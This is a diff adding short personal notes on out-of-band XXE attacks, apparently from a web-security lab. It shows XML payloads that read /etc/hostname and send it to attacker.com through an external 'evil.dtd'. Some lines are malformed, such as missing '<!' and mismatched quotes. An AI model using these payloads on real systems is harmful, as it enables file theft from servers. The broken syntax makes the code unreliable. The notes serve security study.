@@ -79,3 +79,29 @@ stockCheck [ <!ENTITY xxe SYSTEM "http://attacker.com" >]>
 <data>
   <prodId>123</prodId>
 </data>
+
+OOB XXE | Exfiltrating Files
+
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % stack "<!ENTITY &#x25; exfiltrate SYSTEM "http://attacker.com/?x=%file;'>">
+%stack;
+%exfiltrate;
+] // this won't work
+we can't reference a parameter entity within another entity in the doctype subset
+
+use external ddt:
+<!DOCTYPE data [
+<!entity % xxe SYSTEM "http://attacker.com/evil.dtd">
+%xxe;
+]>
+
+<data>
+  <prodId>123</prodId>
+</data>
+
+evil.dtd:
+<ENTITY % file SYSTEM "file:///etc/hostname">
+<ENTITY % stack "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
+%stack;
+%exfiltrate;
